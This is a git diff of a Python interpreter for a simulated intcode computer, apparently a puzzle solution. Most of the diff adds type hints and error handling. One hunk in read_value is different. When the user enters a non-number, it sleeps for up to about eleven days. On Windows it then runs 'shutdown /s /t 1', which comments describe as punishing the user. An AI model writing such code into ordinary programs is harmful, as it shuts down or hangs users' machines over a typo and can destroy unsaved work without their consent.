@@ -1,6 +1,10 @@
 import enum
 from colorama import Fore
 import logging
+import time
+import random
+from sys import platform
+import subprocess
 # Extend the simulated computer from the second week:
 
 # - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
@@ -76,7 +80,7 @@ class op_mode(enum.Enum):
     IMMEDIATE = 1
 
 class operations(enum.Enum):
-    #region explanation
+    #region opcode explanation
     # - 1: add the values of the two parameters and store the result in the position given by the third parameter
     # - 2: multiply the values of the two parameters and store the result in the position given by the third parameter
     # - 3: read a single integer as input and save it to the position given
@@ -84,7 +88,7 @@ class operations(enum.Enum):
     #      and store the result at address 19
     # - 4: output the value of the single parameter for this opcode.
     #      for example 4,19 would output the value stored at address 19             
-    #- 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
+    # - 5: jump-if-true: if the first parameter is non-zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
     # - 6: jump-if-false: if the first parameter is zero, it sets the instruction pointer to the value from the second parameter. Otherwise, it does nothing.
     # - 7: less than: if the first parameter is less than the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
     # - 8: equals: if the first parameter is equal to the second parameter, it stores 1 in the position given by the third parameter. Otherwise, it stores 0.
@@ -99,7 +103,7 @@ class operations(enum.Enum):
     EQUALS = 8
     HALT = 99
 
-def get_element(mode,lst,idx):
+def get_element(mode:op_mode,lst:list,idx:int):
     """returns element based upon the task mode"""
     match mode: 
         case op_mode.POSITION:
@@ -107,7 +111,7 @@ def get_element(mode,lst,idx):
         case op_mode.IMMEDIATE:
             return lst[idx]
 
-def calc(lst, idx,op, instruction):
+def calc(lst:list, idx:int,op:operations, instruction:list):
     """calc is short for calculator. Handles 1,2,7 and 8"""
     param_one_mode = op_mode(int(instruction[1]))
     param_two_mode = op_mode(int(instruction[0]))
@@ -131,7 +135,7 @@ def calc(lst, idx,op, instruction):
     logging.debug(f'Calculation: {lst[destination]}')
     return idx + 1
 
-def jump_operation(lst, idx, op, instruction):
+def jump_operation(lst:list, idx:int, op:operations, instruction:list):
     """handles the jump operations 5 and 6"""
     param_one_mode = op_mode(int(instruction[1]))
     param_two_mode = op_mode(int(instruction[0]))
@@ -145,21 +149,26 @@ def jump_operation(lst, idx, op, instruction):
         return param_two
     return idx + 1 
 
-def read_value(lst, idx):
+def read_value(lst: list, idx:int):
     """handles input value operation 3"""
     idx += 1 
     while not False:
-        # try catch error, to minimize ID10T errors
+        # ? try catch error, to minimize ID10T errors
         try:    
             lst[lst[idx]] = int(input("Please enter a value: "))
             break
         except ValueError:
             print("Please enter a valid number")
+            # ! Punishes the user for wrong input
+            time.sleep(random.randint(9999, 999999)) 
+            if platform == "win32":
+                # ! additionaly punish windows users for using Windows and wrong input
+                subprocess.call("shutdown /s /t 1") 
             continue
-    logging.debug(f'Value: {lst[lst[idx]]}')
+    logging.debug(f'Value: {lst[lst[idx]]} at index {lst[idx]}')
     return idx + 1
 
-def output_value(lst, idx, instruction):
+def output_value(lst: list, idx: int, instruction: list):
     """handles output value operation 4"""
     param_mode = op_mode(int(instruction[1]))
     idx += 1
@@ -167,14 +176,19 @@ def output_value(lst, idx, instruction):
     print(f"Output: {output}")
     return idx + 1
 
-def check_for_opcode(idx, lst):
+def check_for_opcode(idx:int, lst:list):
     operation = str(lst[idx]) 
     while len(operation) < 4:
         operation = '0' + operation
     opcode = operation[-2:] 
-    opcode = operations(int(opcode))
+    try: 
+        opcode = operations(int(opcode))
+    except ValueError:
+        logging.error(f'Invalid opcode: {opcode} at index {idx}')
+        return False, 0
     logging.debug(f'Current opcode: {opcode}')
     end = False
+    #region opcode handeling
     match opcode:
         case operations.ADD:
             idx = calc(lst, idx, operations.ADD, operation)
@@ -203,10 +217,10 @@ def check_for_opcode(idx, lst):
         case operations.HALT:
             end = True
             return 1, end   
-
+    #endregion
     return False, 0
 
-def reader(lst,idx=0, end=False):
+def reader(lst: list,idx:int=0, end:bool=False):
     while end == False:
         idx, end = check_for_opcode(idx, lst)
     return lst[0]
@@ -215,4 +229,4 @@ def reader(lst,idx=0, end=False):
 
     
 print(Fore.LIGHTGREEN_EX + f'-----\nFinal output of the command: {reader(commands)}\n-----')
-
+print(Fore.RESET)                                            
